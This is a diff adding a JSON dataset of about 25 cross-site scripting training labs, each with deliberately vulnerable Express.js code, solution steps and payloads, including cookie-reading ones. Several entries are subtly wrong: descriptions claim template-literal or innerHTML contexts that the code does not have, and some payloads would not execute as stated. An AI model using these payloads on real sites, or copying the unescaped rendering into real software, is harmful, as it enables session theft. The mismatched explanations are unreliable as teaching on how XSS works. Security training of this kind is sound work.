@@ -1,0 +1,482 @@
+[
+    
+    {
+        "Lab scenario": "Online Support Chat Stored XSS in Message Content",
+        "Lab Description": "The support chat system stores user-submitted messages and reflects them using innerHTML in the agent interface. The application doesn't sanitize content before rendering. To solve: Inject a script in the message and trigger execution in the agent view.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Access the /chat endpoint and send a message with XSS payload.",
+        "View the stored message in /agent interface.",
+        "Inspect the DOM to confirm innerHTML is used.",
+        "Confirm the payload executes in the agent's browser.",
+        "Verify control over agent’s session or DOM."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg/onload=alert(document.domain)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/chat', (req, res) => { messages.push(req.body.msg); res.redirect('/chat'); }); app.get('/chat', (req, res) => { res.send(`<form method='POST'><input name='msg'><button>Send</button></form>`); }); app.get('/agent', (req, res) => { const output = messages.map(m => `<div>${m}</div>`).join(''); res.send(`<html><body>${output}</body></html>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Event Scheduler Reflected XSS in Title Field",
+        "Lab Description": "The event scheduler reflects the 'title' parameter in a JavaScript block that sets page content. The application directly inserts the title value into a JS string using double quotes. To solve: Escape the context and execute arbitrary JavaScript.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Navigate to /event?title= and test payload reflection.",
+        "Check the page source for the script tag usage.",
+        "Confirm title is injected inside a quoted string.",
+        "Craft a payload using quotes or semicolons.",
+        "Trigger alert to validate execution."
+        ],
+        "payloads": [
+        "\";alert('XSS');//",
+        "';alert(1);//",
+        "`;alert(document.domain)//"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const app = express(); app.get('/event', (req, res) => { const title = req.query.title || 'My Event'; res.send(`<html><head><script>var t = \"${title}\";</script></head><body></body></html>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Bug Tracker Stored XSS in Issue Description",
+        "Lab Description": "The bug tracker stores submitted issue descriptions and renders them using innerHTML in the issue detail page. No sanitization is performed. To solve: Submit a script payload in the description and view the issue to trigger XSS.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Submit a bug report via /report with an XSS payload in the description.",
+        "Open the issue detail via /issue?id=1.",
+        "Inspect how the description is rendered using innerHTML.",
+        "Trigger payload execution in browser.",
+        "Confirm that JavaScript executes in the page context."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "<iframe src='javascript:alert(1)'>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const issues = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/report', (req, res) => { issues.push({ desc: req.body.description }); res.redirect('/issue?id=1'); }); app.get('/issue', (req, res) => { const issue = issues[0]; res.send(`<div id='desc'></div><script>document.getElementById('desc').innerHTML = \"${issue.desc}\";</script>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Search History Dashboard DOM XSS via Previous Queries",
+        "Lab Description": "The dashboard fetches and displays past search queries using JavaScript by injecting each query into the DOM using innerHTML. To solve: Inject a malicious query that executes script when reflected.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Send a query with an XSS payload via /search?q=.",
+        "Go to /dashboard to see stored queries.",
+        "Inspect how queries are rendered in the DOM.",
+        "Confirm innerHTML usage for rendering.",
+        "Trigger script execution from injected payload."
+        ],
+        "payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert('XSS')>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const app = express(); const history = []; app.get('/search', (req, res) => { const q = req.query.q || ''; history.push(q); res.send('Search stored'); }); app.get('/dashboard', (req, res) => { const result = history.map(q => `<div>${q}</div>`).join(''); res.send(`<html><body>${result}</body></html>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Feedback Portal Stored XSS in Comment Field",
+        "Lab Description": "The feedback page allows users to submit comments, which are stored and displayed without sanitization. The rendering uses innerHTML, introducing an XSS vector. To solve: Submit a script payload that executes on the feedback view page.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Navigate to /feedback and submit a comment with an XSS payload.",
+        "View the stored comment at /view-feedback.",
+        "Inspect DOM for innerHTML usage.",
+        "Trigger payload to confirm execution.",
+        "Confirm successful JavaScript execution in user context."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "<svg/onload=alert('XSS')>",
+        "<img src=x onerror=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/feedback', (req, res) => { feedback.push(req.body.comment); res.redirect('/view-feedback'); }); app.get('/view-feedback', (req, res) => { const output = feedback.map(f => `<p>${f}</p>`).join(''); res.send(`<html><body>${output}</body></html>`); }); app.listen(3000);"
+    },
+   
+    {
+        "Lab scenario": "Internal Blog Platform Stored XSS in Article Title Field",
+        "Lab Description": "The internal blog system allows staff to post articles with a title and content. The title is rendered directly inside an H1 tag using innerHTML on the article view page. No sanitization is performed. To solve: Submit an article with a script payload in the title that executes when viewed.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Access /submit and post a new article with an XSS payload in the title.",
+        "Navigate to /article?id=1 to view the article.",
+        "Inspect how the title is rendered in the DOM.",
+        "Confirm innerHTML is used inside H1.",
+        "Trigger alert from injected payload."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg/onload=alert(1)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const articles = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit', (req, res) => { articles.push({ title: req.body.title, content: req.body.content }); res.redirect('/article?id=1'); }); app.get('/article', (req, res) => { const a = articles[0]; res.send(`<html><body><h1 id='title'></h1><div>${a.content}</div><script>document.getElementById('title').innerHTML = \"${a.title}\";</script></body></html>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Job Portal Reflected XSS in Search Query Parameter",
+        "Lab Description": "The job search page reflects the 'q' parameter inside a JavaScript variable for displaying recent searches. The value is directly inserted inside a JS string using double quotes. To solve: Inject JavaScript that breaks out of the string context.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Go to /jobs?q= with test input.",
+        "Inspect page source for script using 'q' value.",
+        "Confirm reflection inside quoted string in JS block.",
+        "Craft payload that breaks out of the quote context.",
+        "Trigger alert in the browser."
+        ],
+        "payloads": [
+        "\";alert('XSS');//",
+        "';alert(1);//",
+        "`;alert(document.cookie)//"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const app = express(); app.get('/jobs', (req, res) => { const q = req.query.q || ''; res.send(`<html><head><script>var search = \"${q}\";</script></head><body></body></html>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "E-learning Portal Stored XSS in Forum Post Body",
+        "Lab Description": "The forum feature stores user-submitted posts and displays them on the thread page using innerHTML. The post body is stored and rendered without any sanitization. To solve: Submit a post with a script payload that executes on viewing.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Submit a new post via /forum-post with a malicious body.",
+        "Navigate to /thread?id=1 to view it.",
+        "Inspect the DOM and confirm innerHTML rendering.",
+        "Trigger alert to confirm execution.",
+        "Validate JavaScript runs in the page context."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "<svg/onload=alert(1)>",
+        "<img src=x onerror=alert('XSS')>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const threads = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/forum-post', (req, res) => { threads.push(req.body.body); res.redirect('/thread?id=1'); }); app.get('/thread', (req, res) => { res.send(`<div id='post'></div><script>document.getElementById('post').innerHTML = \"${threads[0]}\";</script>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Customer Support Ticket System Stored XSS in Ticket Subject",
+        "Lab Description": "Support tickets store a subject and message. The subject is displayed inside an HTML header using innerHTML when the ticket is viewed. No filtering is applied. To solve: Submit a malicious subject and trigger XSS on the view page.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Submit a new ticket at /ticket with an XSS payload in the subject.",
+        "Access /view-ticket?id=1 to trigger rendering.",
+        "Inspect header rendering of subject.",
+        "Confirm DOM uses innerHTML with unsanitized input.",
+        "Trigger payload in browser."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert('XSS')>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const tickets = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/ticket', (req, res) => { tickets.push({ subject: req.body.subject, body: req.body.body }); res.redirect('/view-ticket?id=1'); }); app.get('/view-ticket', (req, res) => { const t = tickets[0]; res.send(`<h2 id='sub'></h2><p>${t.body}</p><script>document.getElementById('sub').innerHTML = \"${t.subject}\";</script>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "News Aggregator DOM XSS via Source Parameter",
+        "Lab Description": "The news aggregator site reflects the `source` query param in a JS template literal that updates the filter UI. No escaping is performed. To solve: Inject a payload that executes within the JS template context.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Visit /news?source= and inject test payload.",
+        "Inspect JavaScript block where source is reflected.",
+        "Confirm injection in a JS template literal.",
+        "Craft payload using backticks to inject JS.",
+        "Verify execution with alert popup."
+        ],
+        "payloads": [
+        "`;alert('XSS')//",
+        "${alert(document.cookie)}",
+        "`-alert(1)-`"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const app = express(); app.get('/news', (req, res) => { const source = req.query.source || 'global'; res.send(`<html><head><script>let src = \"${source}\";</script></head><body>News</body></html>`); }); app.listen(3000);"
+    },
+
+    {
+        "Lab scenario": "Real Estate Listings Reflected XSS in Search Filter",
+        "Lab Description": "The listings page includes a `location` parameter reflected inside an inline JavaScript assignment within a template literal. The application uses the parameter to highlight recent searches but does not sanitize input. To solve: Inject a payload that breaks out of the JS context and executes a script.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Go to /listings?location= and supply test payloads.",
+        "Inspect JavaScript block for reflection of location param.",
+        "Confirm injection is inside a template literal string.",
+        "Craft payload using backticks or JS expressions.",
+        "Trigger alert to confirm code execution."
+        ],
+        "payloads": [
+        "`;alert('XSS')//",
+        "${alert(1)}",
+        "`-alert(document.cookie)-`"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const app = express(); app.get('/listings', (req, res) => { const location = req.query.location || 'anywhere'; res.send(`<html><head><script>const loc = \"${location}\";</script></head><body>Search</body></html>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Social Media Platform Stored XSS in Comment Field",
+        "Lab Description": "User-submitted comments are stored and displayed beneath each post using innerHTML. No output sanitization is performed. This allows stored JavaScript payloads to execute for all users viewing the comment. To solve: Submit a malicious comment that triggers script execution when the post is viewed.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Submit a comment with an XSS payload using /comment.",
+        "Access the post page at /post?id=1.",
+        "Inspect how comments are rendered in DOM.",
+        "Confirm innerHTML is used without escaping.",
+        "Trigger alert when page loads."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(document.cookie)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/comment', (req, res) => { comments.push(req.body.text); res.redirect('/post?id=1'); }); app.get('/post', (req, res) => { res.send(`<div id='cmt'></div><script>document.getElementById('cmt').innerHTML = \"${comments[0]}\";</script>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "E-Commerce Dashboard DOM XSS via Username in Dashboard Widget",
+        "Lab Description": "The admin dashboard displays the logged-in user's name using `innerHTML` to personalize a widget. The name is set via a cookie and injected into the DOM without sanitization. To solve: Set a malicious cookie value that leads to code execution.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Use a browser extension or JS to set a crafted cookie: username=<payload>.",
+        "Visit /dashboard and observe DOM rendering.",
+        "Check how username is reflected via innerHTML.",
+        "Confirm script execution from payload.",
+        "Trigger alert on widget load."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert('XSS')>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/dashboard', (req, res) => { const name = req.cookies.username || 'Guest'; res.send(`<div id='welcome'></div><script>document.getElementById('welcome').innerHTML = \"${name}\";</script>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Helpdesk Application Reflected XSS in Ticket Filter Parameter",
+        "Lab Description": "The helpdesk UI includes a search filter using the `status` query parameter. This value is reflected directly inside a JavaScript variable using quotes. The reflection is not escaped, allowing arbitrary JS execution. To solve: Craft a payload that breaks out of the quoted string.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Navigate to /tickets?status= with payloads.",
+        "View page source and inspect how `status` is reflected.",
+        "Note injection inside quoted JS variable.",
+        "Craft payload using closing quote and JS injection.",
+        "Trigger alert to verify."
+        ],
+        "payloads": [
+        "\";alert(1);//",
+        "';alert('XSS');//",
+        "\"-alert(document.domain)-\""
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const app = express(); app.get('/tickets', (req, res) => { const status = req.query.status || 'open'; res.send(`<html><script>var s = \"${status}\";</script><body>Tickets</body></html>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Online Learning System Stored XSS in Feedback Field",
+        "Lab Description": "The course feedback form stores submitted content in memory and displays it using `innerHTML` in the review section. No sanitization or escaping is applied. To solve: Submit a malicious script in the feedback field that executes upon rendering.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Submit feedback at /submit-feedback with XSS payload.",
+        "Access /reviews to view the rendered feedback.",
+        "Inspect the DOM for innerHTML usage.",
+        "Confirm payload executes when content is loaded.",
+        "Trigger alert from malicious content."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "<svg onload=alert(1)>",
+        "<img src=x onerror=alert(document.cookie)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-feedback', (req, res) => { feedback.push(req.body.text); res.redirect('/reviews'); }); app.get('/reviews', (req, res) => { res.send(`<div id='fb'></div><script>document.getElementById('fb').innerHTML = \"${feedback[0]}\";</script>`); }); app.listen(3000);"
+    },
+  
+    {
+        "Lab scenario": "Event Management Portal Reflected XSS in Search Field",
+        "Lab Description": "The event search functionality uses a `query` parameter that is reflected inside a script block using double quotes. No input sanitization is applied before rendering, creating a JavaScript injection point. To solve: Inject a payload that breaks out of the quoted string and triggers script execution.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Access /events?query= and try basic payloads.",
+        "Check page source for how the value is used in JS.",
+        "Identify injection inside quoted variable assignment.",
+        "Craft payload using `\";payload//` syntax.",
+        "Trigger alert to confirm successful XSS."
+        ],
+        "payloads": [
+        "\";alert('XSS')//",
+        "';alert(1);//",
+        "\"-alert(document.cookie)-\""
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const app = express(); app.get('/events', (req, res) => { const query = req.query.query || ''; res.send(`<html><script>var q = \"${query}\";</script><body>Events</body></html>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Travel Booking Site Stored XSS in Destination Review",
+        "Lab Description": "User-submitted reviews for destinations are stored and rendered using `innerHTML` without any sanitization. This allows persistent JavaScript code to execute for other users viewing the destination. To solve: Submit a review that contains executable JavaScript.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "POST a review at /submit-review with a script payload.",
+        "Visit /destination?id=1 to view reviews.",
+        "Inspect how the review is injected into the DOM.",
+        "Confirm use of `innerHTML` for rendering.",
+        "Check for alert execution upon page load."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg/onload=alert(document.domain)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const reviews = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-review', (req, res) => { reviews.push(req.body.text); res.redirect('/destination?id=1'); }); app.get('/destination', (req, res) => { res.send(`<div id='reviews'></div><script>document.getElementById('reviews').innerHTML = \"${reviews[0]}\";</script>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Internal Admin Tool DOM XSS via URL Fragment Injection",
+        "Lab Description": "The admin dashboard reads the hash value from `location.hash` and injects it into the DOM using `innerHTML`. The application does not sanitize or validate the hash value, making it exploitable through fragment-based DOM XSS. To solve: Craft a malicious hash payload that executes arbitrary JavaScript.",
+        "Difficulty Level": "Hard",
+        "Solution Steps": [
+        "Navigate to /admin#<payload> in browser.",
+        "Inspect how `location.hash` is used in JS.",
+        "Verify `innerHTML` injection without sanitization.",
+        "Craft payload like `<img src=x onerror=alert(1)>`.",
+        "Ensure alert is triggered from hash content."
+        ],
+        "payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg onload=alert(document.cookie)>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const app = express(); app.get('/admin', (req, res) => { res.send(`<div id='hash'></div><script>document.getElementById('hash').innerHTML = location.hash.slice(1);</script>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Community Forum Reflected XSS in Tag Parameter",
+        "Lab Description": "The forum's post listing page reflects the `tag` query parameter inside an inline `<script>` tag. The value is embedded inside a template literal and used to highlight matching posts. Lack of escaping allows JavaScript injection. To solve: Inject a payload that executes JavaScript in this context.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Visit /posts?tag= with test payloads.",
+        "Inspect script block for template literal injection.",
+        "Craft payload using backticks and template escape.",
+        "Trigger alert to confirm successful injection.",
+        "Validate execution occurs inside `<script>` context."
+        ],
+        "payloads": [
+        "`;alert('XSS')//",
+        "${alert(1)}",
+        "`-alert(document.domain)-`"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const app = express(); app.get('/posts', (req, res) => { const tag = req.query.tag || ''; res.send(`<html><head><script>let t = \"${tag}\";</script></head><body>Forum</body></html>`); }); app.listen(3000);"
+    },
+    {
+        "Lab scenario": "Survey Application Stored XSS in Name Field",
+        "Lab Description": "Survey submissions store user names which are later displayed in a leaderboard using `innerHTML`. Since user input is stored and not sanitized, this leads to stored XSS for any viewer of the leaderboard. To solve: Submit a payload as the name that runs JavaScript upon viewing.",
+        "Difficulty Level": "Medium",
+        "Solution Steps": [
+        "Submit name at /submit-survey with an XSS payload.",
+        "Visit /leaderboard to view stored submissions.",
+        "Inspect how the name is injected into the DOM.",
+        "Confirm use of `innerHTML` without sanitization.",
+        "Check if payload executes as stored content loads."
+        ],
+        "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert('Pwned')>"
+        ],
+        "Vulnerability name": "Cross-site scripting",
+        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const entries = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-survey', (req, res) => { entries.push(req.body.name); res.redirect('/leaderboard'); }); app.get('/leaderboard', (req, res) => { res.send(`<div id='names'></div><script>document.getElementById('names').innerHTML = \"${entries[0]}\";</script>`); }); app.listen(3000);"
+    },
+        {
+          "Lab scenario": "Online Shop Reflected XSS in Discount Code Field",
+          "Lab Description": "The discount code entered in the checkout page is reflected into an inline script using double quotes. No sanitization is applied, allowing attackers to inject JavaScript directly into the script context. To solve: Inject a payload that escapes the quote and executes a script.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Navigate to /checkout?code= and observe reflection.",
+            "View page source to confirm script context.",
+            "Notice double quotes wrapping injected value.",
+            "Craft payload using `\";alert(1)//` pattern.",
+            "Confirm payload triggers JavaScript execution."
+          ],
+          "payloads": [
+            "\";alert(1)//",
+            "';alert(document.domain)//",
+            "\"-alert('XSS')-\""
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "srcCode": "const express = require('express'); const app = express(); app.get('/checkout', (req, res) => { const code = req.query.code || ''; res.send(`<html><script>var discount = \"${code}\";</script><body>Apply discount</body></html>`); }); app.listen(3000);"
+        },
+        {
+          "Lab scenario": "Issue Tracker Stored XSS in Comment Field",
+          "Lab Description": "The issue tracking system allows users to post comments. These comments are displayed using `innerHTML` without escaping, leading to stored XSS. To solve: Submit a comment with an XSS payload and visit the issue page to trigger it.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "POST a comment at /submit-comment with an XSS payload.",
+            "Visit /issue?id=1 to load stored comments.",
+            "Inspect DOM to confirm use of `innerHTML`.",
+            "Check payload rendering in the page source.",
+            "Verify script execution on page load."
+          ],
+          "payloads": [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg/onload=alert(document.cookie)>"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-comment', (req, res) => { comments.push(req.body.text); res.redirect('/issue?id=1'); }); app.get('/issue', (req, res) => { res.send(`<div id='comments'></div><script>document.getElementById('comments').innerHTML = \"${comments[0]}\";</script>`); }); app.listen(3000);"
+        },
+        {
+          "Lab scenario": "Fitness App Reflected XSS in Progress Tracker Filter",
+          "Lab Description": "The `filter` parameter is used in the client-side chart script. It is inserted unescaped inside a JavaScript variable. The application lacks validation or escaping, making it vulnerable to reflected XSS. To solve: Inject a payload that escapes the JS context and executes code.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Open /progress?filter= with test payloads.",
+            "Inspect how value is used inside `<script>`.",
+            "Observe JS variable assignment from filter param.",
+            "Inject using backtick or quote-breaking syntax.",
+            "Trigger alert to confirm XSS."
+          ],
+          "payloads": [
+            "`;alert('XSS')//",
+            "\";alert(1)//",
+            "${alert(document.domain)}"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "srcCode": "const express = require('express'); const app = express(); app.get('/progress', (req, res) => { const filter = req.query.filter || ''; res.send(`<html><head><script>var f = \"${filter}\";</script></head><body>Progress</body></html>`); }); app.listen(3000);"
+        },
+        {
+          "Lab scenario": "Restaurant Review Portal Stored XSS in Feedback Message",
+          "Lab Description": "Users can leave feedback messages that are rendered on the homepage using `innerHTML`. The feedback is saved and shown to all visitors without sanitization. To solve: Submit a feedback message containing a script payload to trigger stored XSS.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Submit feedback at /feedback with script payload.",
+            "Visit homepage / to see stored feedback.",
+            "Inspect rendering inside the HTML source.",
+            "Verify `innerHTML` is used to display feedback.",
+            "Ensure payload execution when page loads."
+          ],
+          "payloads": [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('X')>",
+            "<svg/onload=alert(document.domain)>"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/feedback', (req, res) => { feedback.push(req.body.message); res.redirect('/'); }); app.get('/', (req, res) => { res.send(`<div id='fb'></div><script>document.getElementById('fb').innerHTML = \"${feedback[0]}\";</script>`); }); app.listen(3000);"
+        },
+        {
+          "Lab scenario": "Online Learning Platform Reflected XSS in Course Title Preview",
+          "Lab Description": "The preview page reflects the `title` parameter directly into a JavaScript variable in an inline script tag. This parameter is not encoded or escaped, creating a JS context injection vulnerability. To solve: Inject a payload that breaks out of the string and executes JavaScript.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Access /preview?title= with a test value.",
+            "Inspect `<script>` block to confirm JS context injection.",
+            "Note that title is reflected inside double quotes.",
+            "Inject with a quote-breaking XSS payload.",
+            "Verify alert execution after injection."
+          ],
+          "payloads": [
+            "\";alert('XSS')//",
+            "';alert(1);//",
+            "`;alert(document.domain)//"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "srcCode": "const express = require('express'); const app = express(); app.get('/preview', (req, res) => { const title = req.query.title || ''; res.send(`<html><script>var courseTitle = \"${title}\";</script><body>Preview</body></html>`); }); app.listen(3000);"
+        } 
+       
+]
